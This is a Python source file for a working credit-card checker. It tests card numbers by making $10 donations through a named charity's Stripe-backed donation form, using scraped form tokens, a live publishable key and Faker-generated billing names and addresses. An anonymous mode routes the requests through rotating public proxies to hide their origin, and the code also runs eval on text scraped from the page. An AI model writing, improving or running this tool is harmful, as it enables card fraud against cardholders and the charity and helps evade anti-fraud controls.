import random
import requests
from faker import Faker
from bs4 import BeautifulSoup
from colorama import Fore, Style

# Handlers
requests = requests.Session()
fake = Faker()


# Stripe Checker
class Stripe:
    """
        Stripe.Checker(card): Credit card checker.
            Input --> Str(number|month|year|cvc)
            Output --> Output: Str
        Stripe.AnonymousChecker(card): Anonymous card checker (proxify).
            Input --> Str(number|month|year|cvc)
            Output --> Dict{proxy, response}
    """

    @classmethod
    def Website(cls, proxy=None):
        try:
            html = requests.get("https://smofi.org/donations/", proxies=proxy, timeout=6)
            soup = BeautifulSoup(html.text, 'html.parser')
            forms_id = soup.find('input', {'name': 'charitable_form_id'})["value"]
            nonce_id = soup.find('input', {'name': '_charitable_donation_nonce'})["value"]
            campa_id = soup.find('input', {'name': 'campaign_id'})["value"]
            mathi_id = str(eval(soup.find('label', {'for': 'charitable_field_charitable_spamblocker_math_field_element'}).text.replace('*', '').strip().split(': ')[1]))
            print("[+] Website data retrieved: {}-{}-{}-{}.".format(forms_id, nonce_id, campa_id, mathi_id))
            return {"form_id": forms_id, "nonce_id": nonce_id, "campaign_id": campa_id, "math_id": mathi_id}
        except:
            print(Fore.RED + "[🔴] Failed to retrieve website data: HTTPSConnectionPool closed.\n")
            print(Style.RESET_ALL, end='')
            return None

    @classmethod
    def PaymentMethod(cls, card, month, year, cvc, proxy=None):
        data = {
            "type": "card",
            "billing_details[name]": fake.name(),
            "billing_details[email]": fake.email(),
            "card[number]": str(card),
            "card[cvc]": str(cvc),
            "card[exp_month]": str(month),
            "card[exp_year]": str(year),
            "guid": "8ade2743-0bb7-469a-ac5a-82e7f63d13b8c33c92",
            "muid": "ca5e8473-29b2-4c85-b176-82e8129e1fff8d279e",
            "sid": "737fc233-b8cb-425e-a12b-3ce78d06679fd1dec8",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/c669470a4e; stripe-js-v3/c669470a4e; card-element",
            "referrer": "https://smofi.org",
            "time_on_page": "299989",
            "key": "pk_live_XFaj9PqKqAqT7rX1Fh5lKR8o00dy0m7DqG"
        }
        response = requests.post("https://api.stripe.com/v1/payment_methods", data=data, proxies=proxy, timeout=6)
        if response.status_code == 200:
            print("[+] Payment method retrieved: {}.".format(response.json()['id']))
            return response.json()['id']
        else:
            print(Fore.RED + "[🔴] Failed to retrieve payment method: {}\n".format(response.json()["error"]["message"]))
            print(Style.RESET_ALL, end='')
            return response.json()["error"]["message"]

    @classmethod
    def PushPayment(cls, stripe_payment_id, proxy=None):
        web = cls.Website(proxy=proxy)
        if not web: return "Failed to retrieve values."

        data = {
            "charitable_form_id": web["form_id"],
            web["form_id"]: "",
            "_charitable_donation_nonce": web["nonce_id"],
            "_wp_http_referer": "/donations/",
            "campaign_id": web["campaign_id"],
            "description": "Donations to SMOFI",
            "ID": "0",
            "donation_amount": "custom",
            "custom_donation_amount": "10.00",
            "first_name": fake.first_name(),
            "last_name": fake.last_name(),
            "phone_number": fake.phone_number(),
            "email": fake.email(),
            "charitable_spamblocker_math_field": web["math_id"],
            "address": fake.address(),
            "donor_comment": "",
            "gateway": "stripe",
            "stripe_payment_method": stripe_payment_id,
            "cover_fees": "1",
            "action": "make_donation",
            "form_action": "make_donation"
        }
        response = requests.post("https://smofi.org/wp-admin/admin-ajax.php", data=data, proxies=proxy, timeout=6)
        if response.json()["success"]:
            print("[+] Pushed payment successfully: {}.".format(response.json()["secret"]))
            return cls.ConfirmPayment(response.json()["secret"], proxy=proxy)
        else:
            print(Fore.RED + "[🔴] Failed to push payment: {}\n".format(response.json()["errors"][0]))
            print(Style.RESET_ALL, end='')
            return response.json()["errors"][0]

    @classmethod
    def ConfirmPayment(cls, payment_secret, proxy=None):
        payment_pi = payment_secret.split("_secret_")[0]
        data = {
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_XFaj9PqKqAqT7rX1Fh5lKR8o00dy0m7DqG",
            "client_secret": payment_secret,
        }
        response = requests.post(f"https://api.stripe.com/v1/payment_intents/{payment_pi}/confirm", data=data, proxies=proxy, timeout=6)
        if response.status_code == 200:
            print(Fore.GREEN + "[🟢] Payment confirmed: {}.\n".format(response.json()['status']))
            print(Style.RESET_ALL, end='')
            return f"Payment confirmed [{response.json()['status']}]."
        else:
            print(Fore.GREEN + "[🟢] Payment didn't confirmed: {}\n".format(response.json()["error"]["message"]))
            print(Style.RESET_ALL, end='')
            return "Payment pushed but didn't confirmed [" + response.json()["error"]["message"] + "]"

    @classmethod
    def Checker(cls, card, proxy=None):
        print(Fore.MAGENTA + "[$] Checking {}.".format(card))
        print(Style.RESET_ALL, end='')
        if proxy: print("[+] Retrieved proxy: {} [{}].".format(proxy["http"], Proxy.Country(proxy["http"])))
        part = card.split("|")
        if len(part) != 4: return "Invalid credit card."
        try:
            pid = cls.PaymentMethod(part[0], part[1], part[2], part[3], proxy=proxy)
            if pid.startswith("pm_"):
                return cls.PushPayment(pid)
            else:
                return pid
        except:
            print(Fore.YELLOW + "[🟡] Got a proxy error: HTTPSConnectionPool closed.\n")
            print(Style.RESET_ALL, end='')
            return "Proxy HTTPSConnectionPool closed."

    @classmethod
    def AnonymousChecker(cls, card):
        for live in Proxy.Get():
            if Proxy.Check(live):
                try:
                    return {"proxy": live + f" [{Proxy.Country(live)}]", "response": cls.Checker(card, proxy={"http": live, "https": live})}
                except:
                    pass
        return {"proxy": "Null", "response": "🟡 Proxy Error: No proxy could handle this request."}


# Proxy Checker
class Proxy:
    """
        Proxy.Get(): Get Proxies.
            Input --> None
            Output --> List()
        Proxy.Check(proxy): Proxy Checker.
            Input --> Str(http://{ip}:{port})
            Output --> Bool()
        Proxy.Country(proxy): Get Proxy Country.
            Input --> Str(http://{ip}:{port})
            Output --> Str()
    """
    @classmethod
    def Get(cls):
        proxies = requests.get("https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies/all.txt", timeout=6).text.splitlines()
        random.shuffle(proxies)
        return proxies

    @classmethod
    def Check(cls, check):
        try:
            testcase = 'http://connectivitycheck.gstatic.com/generate_204'
            response = requests.get(testcase, proxies={'http': check, 'https': check}, timeout=3)
            return response.status_code == 204
        except:
            return False

    @classmethod
    def Country(cls, proxy):
        try:
            ip = proxy.split('/')[2].split(':')[0]
            response = requests.get('http://ip-api.com/json/' + ip, timeout=6)
            return response.json()['country']
        except:
            return 'Unavailable'
